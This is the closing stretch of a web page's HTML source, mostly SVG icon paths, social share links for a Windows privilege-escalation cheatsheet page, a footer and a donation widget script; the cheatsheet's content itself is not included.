29.147161 61.260079 25.522903 48.675314 25.166016 47.435547 L 61.013672 24.226562 A 1.0001 1.0001 0 0 0 62 25 A 1.0001 1.0001 0 0 0 62.988281 23.783203 C 63.014848 23.477186 62.989225 23.17624 62.855469 22.876953 C 62.639651 22.394056 62.128723 22.100054 61.765625 22.03125 C 61.039429 21.893642 60.566406 22.158203 60.566406 22.158203 L 60.466797 22.195312 L 23.857422 45.900391 L 9.8261719 41.261719 L 9.8222656 41.259766 C 9.8185507 41.25848 9.3777555 41.099419 8.9082031 40.771484 C 8.4366726 40.442168 8.062164 40.014757 8.0039062 39.556641 C 7.9835322 39.396426 8.0143062 39.287873 8.140625 39.105469 C 8.2669443 38.923065 8.501119 38.707449 8.7675781 38.527344 C 9.3004964 38.167134 9.8886719 37.962891 9.8886719 37.962891 L 9.9199219 37.951172 L 9.953125 37.9375 C 9.953125 37.9375 24.279232 31.97306 38.859375 25.910156 C 46.149446 22.878704 53.503668 19.823883 59.160156 17.476562 C 64.816644 15.129243 68.856374 13.458984 69.261719 13.300781 C 69.707777 13.127547 70.168373 13.038612 70.566406 13.021484 z M 59.199219 25.699219 L 58.398438 26.101562 L 58.240234 26.984375 L 58.853516 27.638672 L 59.199219 27.699219 L 60 27.298828 L 60.158203 26.416016 L 59.546875 25.761719 L 59.199219 25.699219 z M 56.400391 28.400391 L 55.599609 28.800781 L 55.441406 29.683594 L 56.052734 30.337891 L 56.400391 30.400391 L 57.201172 29.998047 L 57.359375 29.117188 L 56.746094 28.462891 L 56.400391 28.400391 z M 53.599609 31.099609 L 52.798828 31.501953 L 52.640625 32.382812 L 53.251953 33.037109 L 53.599609 33.099609 L 54.400391 32.699219 L 54.558594 31.816406 L 53.947266 31.162109 L 53.599609 31.099609 z M 50.800781 33.800781 L 49.998047 34.201172 L 49.841797 35.083984 L 50.453125 35.738281 L 50.800781 35.800781 L 51.601562 35.398438 L 51.759766 34.517578 L 51.146484 33.861328 L 50.800781 33.800781 z M 48 36.5 L 47.199219 36.902344 L 47.041016 37.783203 L 47.652344 38.4375 L 48 38.5 L 48.800781 38.099609 L 48.958984 37.216797 L 48.347656 36.5625 L 48 36.5 z M 45.199219 39.199219 L 44.398438 39.601562 L 44.240234 40.484375 L 44.853516 41.138672 L 45.199219 41.199219 L 46.001953 40.798828 L 46.158203 39.916016 L 45.546875 39.261719 L 45.199219 39.199219 z M 42.400391 41.900391 L 41.599609 42.300781 L 41.441406 43.183594 L 42.052734 43.837891 L 42.400391 43.900391 L 43.201172 43.498047 L 43.359375 42.617188 L 42.746094 41.962891 L 42.400391 41.900391 z M 39.599609 44.599609 L 38.798828 45.001953 L 38.640625 45.882812 L 39.253906 46.537109 L 39.599609 46.599609 L 40.400391 46.199219 L 40.558594 45.316406 L 39.947266 44.662109 L 39.599609 44.599609 z M 36.800781 47.300781 L 35.998047 47.701172 L 35.841797 48.583984 L 36.453125 49.238281 L 36.800781 49.300781 L 37.601562 48.898438 L 37.759766 48.015625 L 37.146484 47.361328 L 36.800781 47.300781 z M 34.675781 52.824219 L 40.794922 57.730469 L 32.378906 65.132812 L 34.675781 52.824219 z" /> </symbol> <symbol id="icon-youtube" viewBox="0 0 24 24"> <path d="M4.652 0h1.44l.988 3.702.916-3.702h1.454l-1.665 5.505v3.757h-1.431v-3.757l-1.702-5.505zm6.594 2.373c-1.119 0-1.861.74-1.861 1.835v3.349c0 1.204.629 1.831 1.861 1.831 1.022 0 1.826-.683 1.826-1.831v-3.349c0-1.069-.797-1.835-1.826-1.835zm.531 5.127c0 .372-.19.646-.532.646-.351 0-.554-.287-.554-.646v-3.179c0-.374.172-.651.529-.651.39 0 .557.269.557.651v3.179zm4.729-5.07v5.186c-.155.194-.5.512-.747.512-.271 0-.338-.186-.338-.46v-5.238h-1.27v5.71c0 .675.206 1.22.887 1.22.384 0 .918-.2 1.468-.853v.754h1.27v-6.831h-1.27zm2.203 13.858c-.448 0-.541.315-.541.763v.659h1.069v-.66c.001-.44-.092-.762-.528-.762zm-4.703.04c-.084.043-.167.109-.25.198v4.055c.099.106.194.182.287.229.197.1.485.107.619-.067.07-.092.105-.241.105-.449v-3.359c0-.22-.043-.386-.129-.5-.147-.193-.42-.214-.632-.107zm4.827-5.195c-2.604-.177-11.066-.177-13.666 0-2.814.192-3.146 1.892-3.167 6.367.021 4.467.35 6.175 3.167 6.367 2.6.177 11.062.177 13.666 0 2.814-.192 3.146-1.893 3.167-6.367-.021-4.467-.35-6.175-3.167-6.367zm-12.324 10.686h-1.363v-7.54h-1.41v-1.28h4.182v1.28h-1.41v7.54zm4.846 0h-1.21v-.718c-.223.265-.455.467-.696.605-.652.374-1.547.365-1.547-.955v-5.438h1.209v4.988c0 .262.063.438.322.438.236 0 .564-.303.711-.487v-4.939h1.21v6.506zm4.657-1.348c0 .805-.301 1.431-1.106 1.431-.443 0-.812-.162-1.149-.583v.5h-1.221v-8.82h1.221v2.84c.273-.333.644-.608 1.076-.608.886 0 1.18.749 1.18 1.631v3.609zm4.471-1.752h-2.314v1.228c0 .488.042.91.528.91.511 0 .541-.344.541-.91v-.452h1.245v.489c0 1.253-.538 2.013-1.813 2.013-1.155 0-1.746-.842-1.746-2.013v-2.921c0-1.129.746-1.914 1.837-1.914 1.161 0 1.721.738 1.721 1.914v1.656z" /> </symbol> <symbol id="icon-gitlab" viewBox="-5 -15 220 200"> <path d="M105.0614,193.655 L105.0614,193.655 L143.7014,74.734 L66.4214,74.734 L105.0614,193.655 L105.0614,193.655 Z" /> <path d="M105.0614,193.6548 L66.4214,74.7338 L12.2684,74.7338 L105.0614,193.6548 Z" /> <path d="M12.2685,74.7341 L12.2685,74.7341 L0.5265,110.8731 C-0.5445,114.1691 0.6285,117.7801 3.4325,119.8171 L105.0615,193.6551 L12.2685,74.7341 Z" /> &lt;path d="M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z" "/&gt; <path d="M105.0614,193.6548 L143.7014,74.7338 L197.8544,74.7338 L105.0614,193.6548 Z" /> <path d="M197.8544,74.7341 L197.8544,74.7341 L209.5964,110.8731 C210.6674,114.1691 209.4944,117.7801 206.6904,119.8171 L105.0614,193.6551 L197.8544,74.7341 Z" /> <path d="M197.8544,74.7342 L143.7014,74.7342 L166.9744,3.1092 C168.1714,-0.5768 173.3854,-0.5758 174.5824,3.1092 L197.8544,74.7342 Z" /> </symbol> </defs></svg> <p><br /></p> <section class="share"> <h2> Share </h2> <a aria-label="Share on Twitter" href="https://twitter.com/intent/tweet?text=Privilege Escalation cheatsheet for Windows systems!%20https://maoutis.github.io/pentest-cheatsheets/Privilege%20Escalation/Windows/%20via%20&#64;0xbro1&amp;hashtags=Windows,privesc,windows-privesc," onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;" title="Share on Twitter"> <svg class="icon icon-twitter"><use xlink:href="#icon-twitter"></use></svg> </a> <a aria-label="Share on Facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://maoutis.github.io/pentest-cheatsheets/Privilege%20Escalation/Windows/" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;" title="Share on Facebook"> <svg class="icon icon-facebook"><use xlink:href="#icon-facebook"></use></svg> </a> <a aria-label="Share on Google Plus" href="https://plus.google.com/share?url=https://maoutis.github.io/pentest-cheatsheets/Privilege%20Escalation/Windows/" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;" title="Share on Google+"> <svg class="icon icon-google-plus"><use xlink:href="#icon-google-plus"></use></svg> </a> </section> <footer> <p align="center">Made by <code>0x<i>bro</i></code> with 💜 💛 </p> </footer> <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="0xbro" data-description="Support me on Buy me a coffee!" data-message="I'm creating cyber security contents like CTF writeups, videos and articles. Do you find my work interesting? You can now offer me a cup of coffee!" data-color="#BD5FFF" data-position="left" data-x_margin="18" data-y_margin="18"></script> </div> </div> <a href="#" id="search-button" class="search-button"> <svg viewBox="0 0 24 24" class="icon"><use xlink:href="#svg-search"></use></svg> </a> <div class="search-overlay"></div> </div> </body> </html>
